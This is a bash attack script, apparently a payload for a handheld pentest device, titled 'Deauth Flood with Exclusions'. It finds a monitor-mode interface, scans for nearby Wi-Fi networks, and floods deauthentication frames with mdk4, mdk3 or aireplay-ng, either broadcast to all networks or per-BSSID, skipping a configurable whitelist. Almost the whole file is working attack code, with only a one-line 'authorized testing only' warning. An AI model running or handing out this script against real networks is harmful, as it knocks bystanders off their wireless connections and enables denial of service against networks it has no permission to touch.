#!/bin/bash
# Title: Deauth Flood with Exclusions
# Description: Performs targeted deauth flood with BSSID/SSID exclusion filters
# Author: Community
# Version: 1.3
# Category: Attack
#
# WARNING: For authorized testing only. Unauthorized use is illegal.
#
# Tools: mdk4 (preferred), mdk3, aireplay-ng (fallback)
#
# Note: SSID exclusions are resolved to BSSIDs via network scan.
#       aireplay-ng fallback has limited exclusion support.

# ============================================
# OPTIONS - Configure these before running
# ============================================

# Loot directory for saving scan results and logs
LOOTDIR=/root/loot/deauth_flood

# Excluded BSSIDs (comma-separated, e.g., "AA:BB:CC:DD:EE:FF,11:22:33:44:55:66")
EXCLUDED_BSSIDS=""

# Excluded SSIDs (comma-separated, e.g., "MyHomeNetwork,LabNetwork")
EXCLUDED_SSIDS=""

# ============================================
# INTERNAL FILES
# ============================================

SCAN_RESULTS="/tmp/deauth_scan.txt"
WHITELIST_TMP="/tmp/deauth_whitelist.txt"
STATUS_FILE="/tmp/deauth_status.txt"

# Process tracking
DEAUTH_PID=""
AIREPLAY_PIDS=""
LISTENER_PID=""
START_TIME=""

# ============================================
# CLEANUP - Set trap early
# ============================================

cleanup() {
    LOG "Cleaning up..."
    
    # Kill background listener if running
    if [ -n "$LISTENER_PID" ] && kill -0 "$LISTENER_PID" 2>/dev/null; then
        kill "$LISTENER_PID" 2>/dev/null
        wait "$LISTENER_PID" 2>/dev/null
    fi
    
    # Kill main deauth process
    if [ -n "$DEAUTH_PID" ] && kill -0 "$DEAUTH_PID" 2>/dev/null; then
        kill "$DEAUTH_PID" 2>/dev/null
        wait "$DEAUTH_PID" 2>/dev/null
    fi
    
    # Kill any aireplay-ng processes we started
    if [ -n "$AIREPLAY_PIDS" ]; then
        for pid in $AIREPLAY_PIDS; do
            kill "$pid" 2>/dev/null
        done
    fi
    
    rm -f "$WHITELIST_TMP" "$SCAN_RESULTS" "$STATUS_FILE"
}

trap cleanup EXIT

# ============================================
# HELPER FUNCTIONS
# ============================================

# Get elapsed time in human readable format
get_elapsed_time() {
    if [ -n "$START_TIME" ]; then
        local now=$(date +%s)
        local elapsed=$((now - START_TIME))
        local mins=$((elapsed / 60))
        local secs=$((elapsed % 60))
        printf "%02d:%02d" $mins $secs
    else
        echo "00:00"
    fi
}

# Find interfaces in monitor mode using iw
detect_monitor_interface() {
    local iface
    for iface in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
        if iw dev "$iface" info 2>/dev/null | grep -q "type monitor"; then
            echo "$iface"
            return 0
        fi
    done
    return 1
}

# Detect available deauth tool
detect_deauth_tool() {
    if command -v mdk4 &>/dev/null; then
        echo "mdk4"
    elif command -v mdk3 &>/dev/null; then
        echo "mdk3"
    elif command -v aireplay-ng &>/dev/null; then
        echo "aireplay-ng"
    else
        echo ""
    fi
}

# Scan for networks and save results (BSSID SSID pairs)
scan_networks() {
    LOG "Scanning for networks to resolve SSIDs..."
    local spinner_id=$(START_SPINNER "Scanning")
    
    # Try airodump-ng for a quick scan (captures to file)
    if command -v airodump-ng &>/dev/null; then
        timeout 5 airodump-ng --write-interval 1 -w /tmp/deauth_airoscan --output-format csv "$INTERFACE" &>/dev/null
        if [ -f /tmp/deauth_airoscan-01.csv ]; then
            # Parse airodump CSV: BSSID is field 1, SSID is field 14
            awk -F',' 'NR>2 && $1 ~ /^[0-9A-Fa-f:]+$/ {gsub(/^ +| +$/,"",$1); gsub(/^ +| +$/,"",$14); if($14!="") print toupper($1),$14}' /tmp/deauth_airoscan-01.csv > "$SCAN_RESULTS" 2>/dev/null
            rm -f /tmp/deauth_airoscan-*.csv /tmp/deauth_airoscan-*.cap 2>/dev/null
        fi
    fi
    
    # Fallback: try iw scan (may not work in monitor mode on all devices)
    if [ ! -s "$SCAN_RESULTS" ]; then
        iw dev "$INTERFACE" scan 2>/dev/null | awk '
            /^BSS / { bssid=toupper($2); gsub(/\(.*/, "", bssid) }
            /SSID:/ { ssid=$2; if(ssid!="" && bssid!="") print bssid, ssid }
        ' > "$SCAN_RESULTS" 2>/dev/null
    fi
    
    STOP_SPINNER $spinner_id
    
    local count=$(wc -l < "$SCAN_RESULTS" 2>/dev/null | tr -d ' ')
    if [ "$count" -gt 0 ]; then
        LOG green "Found $count networks"
        # Save scan results to loot directory
        cp "$SCAN_RESULTS" "$LOOTDIR/scan_$(date +%Y%m%d_%H%M%S).txt" 2>/dev/null
        return 0
    else
        LOG yellow "No networks found in scan"
        return 1
    fi
}

# Resolve SSID to BSSID using scan results
resolve_ssid_to_bssid() {
    local ssid="$1"
    if [ -f "$SCAN_RESULTS" ]; then
        grep -i " $ssid$" "$SCAN_RESULTS" | awk '{print $1}' | head -1
    fi
}

# Build whitelist temp file from config variables
build_whitelist() {
    > "$WHITELIST_TMP"
    
    # Add excluded BSSIDs directly from config
    if [ -n "$EXCLUDED_BSSIDS" ]; then
        IFS=',' read -ra bssids <<< "$EXCLUDED_BSSIDS"
        for bssid in "${bssids[@]}"; do
            bssid=$(echo "$bssid" | tr -d ' ' | tr '[:lower:]' '[:upper:]')
            if [ -n "$bssid" ]; then
                echo "$bssid" >> "$WHITELIST_TMP"
                LOG "Excluding BSSID: $bssid"
            fi
        done
    fi
    
    # Resolve and add excluded SSIDs from config
    if [ -n "$EXCLUDED_SSIDS" ]; then
        IFS=',' read -ra ssids <<< "$EXCLUDED_SSIDS"
        for ssid in "${ssids[@]}"; do
            ssid=$(echo "$ssid" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            if [ -n "$ssid" ]; then
                local resolved_bssid=$(resolve_ssid_to_bssid "$ssid")
                if [ -n "$resolved_bssid" ]; then
                    echo "$resolved_bssid" >> "$WHITELIST_TMP"
                    LOG "Excluding SSID '$ssid' -> BSSID: $resolved_bssid"
                else
                    LOG yellow "WARNING: Could not resolve SSID '$ssid' to BSSID"
                fi
            fi
        done
    fi
    
    # Remove duplicates
    if [ -f "$WHITELIST_TMP" ]; then
        sort -u "$WHITELIST_TMP" -o "$WHITELIST_TMP"
    fi
    
    local count=$(wc -l < "$WHITELIST_TMP" 2>/dev/null | tr -d ' ')
    LOG "Whitelist created with $count exclusions"
}

# Check if BSSID should be excluded (for aireplay-ng)
is_excluded() {
    local bssid="$1"
    bssid=$(echo "$bssid" | tr '[:lower:]' '[:upper:]')
    if [ -f "$WHITELIST_TMP" ]; then
        grep -qi "^$bssid$" "$WHITELIST_TMP" && return 0
    fi
    return 1
}

# ============================================
# MAIN SCRIPT
# ============================================

LOG "=== Deauth Flood with Exclusions ==="
LOG ""

# Create loot directory
mkdir -p "$LOOTDIR"

# Detect monitor interface
LOG "Checking for monitor mode interface..."
INTERFACE=$(detect_monitor_interface)

if [ -z "$INTERFACE" ]; then
    LOG red "ERROR: No monitor mode interface found"
    ERROR_DIALOG "No monitor mode interface found. Enable monitor mode first."
    exit 1
fi

LOG green "Found monitor interface: $INTERFACE"

# Detect deauth tool
LOG "Checking for available tools..."
TOOL=$(detect_deauth_tool)

if [ -z "$TOOL" ]; then
    LOG red "ERROR: No deauth tools available"
    ERROR_DIALOG "No deauth tools found (mdk4/mdk3/aireplay-ng)"
    exit 1
fi

LOG green "Using tool: $TOOL"
LOG ""

# Show configured exclusions
if [ -n "$EXCLUDED_SSIDS" ]; then
    LOG "Excluded SSIDs: $EXCLUDED_SSIDS"
else
    LOG "No SSID exclusions configured"
fi

if [ -n "$EXCLUDED_BSSIDS" ]; then
    LOG "Excluded BSSIDs: $EXCLUDED_BSSIDS"
else
    LOG "No BSSID exclusions configured"
fi

LOG ""

# Check if exclusions are configured
HAS_EXCLUSIONS=false
if [ -n "$EXCLUDED_SSIDS" ] || [ -n "$EXCLUDED_BSSIDS" ]; then
    HAS_EXCLUSIONS=true
fi

# Warn if using aireplay-ng with exclusions
if [ "$TOOL" = "aireplay-ng" ] && [ "$HAS_EXCLUSIONS" = true ]; then
    LOG yellow "WARNING: aireplay-ng has limited exclusion support"
    resp=$(CONFIRMATION_DIALOG "aireplay-ng cannot fully support exclusions. Continue anyway?")
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Dialog error"
            exit 1
            ;;
    esac
    case "$resp" in
        $DUCKYSCRIPT_USER_DENIED)
            LOG "User cancelled due to tool limitation"
            exit 0
            ;;
    esac
fi

# Scan for networks if SSID exclusions are configured
if [ -n "$EXCLUDED_SSIDS" ]; then
    scan_networks
fi

# Confirm before starting attack
LOG "Requesting confirmation..."
resp=$(CONFIRMATION_DIALOG "Start deauth flood on $INTERFACE?")
case $? in
    $DUCKYSCRIPT_REJECTED)
        LOG "Dialog rejected"
        exit 1
        ;;
    $DUCKYSCRIPT_ERROR)
        LOG "An error occurred"
        exit 1
        ;;
esac

case "$resp" in
    $DUCKYSCRIPT_USER_CONFIRMED)
        LOG "User confirmed - starting attack"
        ;;
    $DUCKYSCRIPT_USER_DENIED)
        LOG "User declined"
        exit 0
        ;;
    *)
        LOG "Unknown response: $resp"
        exit 1
        ;;
esac

# Build whitelist file for exclusions
build_whitelist

# Record start time
START_TIME=$(date +%s)

# Execute deauth attack
LOG ""
LOG "============================================"
LOG "=== Starting Deauth Attack ==="
LOG "============================================"
LOG ""

target_count=0

case "$TOOL" in
    mdk4|mdk3)
        LOG "Tool: $TOOL"
        LOG "Interface: $INTERFACE"
        if [ -s "$WHITELIST_TMP" ]; then
            exclusion_count=$(wc -l < "$WHITELIST_TMP" | tr -d ' ')
            LOG "Exclusions: $exclusion_count BSSIDs whitelisted"
            LOG ""
            LOG "Starting $TOOL with whitelist..."
            $TOOL "$INTERFACE" d -w "$WHITELIST_TMP" &
        else
            LOG "Exclusions: None (attacking all targets)"
            LOG ""
            LOG "Starting $TOOL in broadcast mode..."
            $TOOL "$INTERFACE" d &
        fi
        DEAUTH_PID=$!
        LOG green "Attack process started (PID: $DEAUTH_PID)"
        ;;
    aireplay-ng)
        LOG "Tool: aireplay-ng"
        LOG "Interface: $INTERFACE"
        if [ -s "$WHITELIST_TMP" ] && [ -s "$SCAN_RESULTS" ]; then
            # Target-by-target deauth, excluding whitelisted BSSIDs
            LOG "Mode: Targeted (per-BSSID)"
            LOG ""
            LOG "Launching targeted deauth processes..."
            AIREPLAY_PIDS=""
            while read -r bssid ssid; do
                if ! is_excluded "$bssid"; then
                    target_count=$((target_count + 1))
                    LOG "  [$target_count] Targeting: $bssid ($ssid)"
                    aireplay-ng --deauth 0 -a "$bssid" "$INTERFACE" &>/dev/null &
                    AIREPLAY_PIDS="$AIREPLAY_PIDS $!"
                else
                    LOG yellow "  [SKIP] Excluded: $bssid ($ssid)"
                fi
            done < "$SCAN_RESULTS"
            
            if [ -z "$AIREPLAY_PIDS" ]; then
                LOG yellow "No targets to attack after exclusions"
                ALERT "No targets available"
                exit 0
            fi
            LOG ""
            LOG green "Attacking $target_count targets"
        else
            # No exclusions or no scan data - broadcast deauth
            LOG "Mode: Broadcast (all networks)"
            LOG yellow "Note: No scan data - using broadcast deauth"
            LOG ""
            aireplay-ng --deauth 0 -a FF:FF:FF:FF:FF:FF "$INTERFACE" &>/dev/null &
            DEAUTH_PID=$!
            LOG green "Broadcast attack started (PID: $DEAUTH_PID)"
        fi
        ;;
esac

# Save initial status
echo "RUNNING|$TOOL|$INTERFACE|$target_count" > "$STATUS_FILE"

LOG ""
LOG "============================================"
LOG green "Deauth flood is running!"
LOG "============================================"
LOG ""
LOG "Press any button to stop the attack"
LOG ""

# Start background status updater
(
    while true; do
        if [ -f "$STATUS_FILE" ]; then
            elapsed=$(get_elapsed_time)
            # Update status every 10 seconds
            sleep 10
            if [ -n "$DEAUTH_PID" ] && kill -0 "$DEAUTH_PID" 2>/dev/null; then
                LOG "Status: Running | Elapsed: $elapsed | Tool: $TOOL"
            elif [ -n "$AIREPLAY_PIDS" ]; then
                # Check if any aireplay process is still running
                running=0
                for pid in $AIREPLAY_PIDS; do
                    kill -0 "$pid" 2>/dev/null && running=$((running + 1))
                done
                if [ $running -gt 0 ]; then
                    LOG "Status: Running | Elapsed: $elapsed | Targets: $running active"
                fi
            else
                break
            fi
        else
            break
        fi
    done
) &
LISTENER_PID=$!

# Wait for user to press any button
resp=$(WAIT_FOR_INPUT)

# Calculate final elapsed time
elapsed=$(get_elapsed_time)

LOG ""
LOG yellow "User pressed: $resp - stopping attack..."

# Update status
echo "STOPPED|$elapsed" > "$STATUS_FILE"

# Summary
LOG ""
LOG "============================================"
LOG "=== Attack Summary ==="
LOG "============================================"
LOG "Tool used: $TOOL"
LOG "Interface: $INTERFACE"
LOG "Duration: $elapsed"
if [ $target_count -gt 0 ]; then
    LOG "Targets attacked: $target_count"
fi
LOG ""

# Cleanup is handled by trap
LOG green "Deauth flood stopped"
ALERT "Attack stopped after $elapsed"
